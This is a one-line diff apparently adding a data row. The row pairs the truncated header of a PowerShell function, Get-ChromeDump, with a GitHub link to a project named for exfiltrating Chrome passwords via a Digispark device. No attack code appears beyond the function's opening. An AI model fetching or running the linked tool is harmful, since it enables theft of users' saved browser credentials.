@@ -1,0 +1,1 @@
+Function Get-ChromeDump{ [CmdletBinding()] param( [Parameter ...,https://raw.githubusercontent.com/jcldf/digispark-chrome-password-exfiltrate/master/Get-ChromeDump.ps1
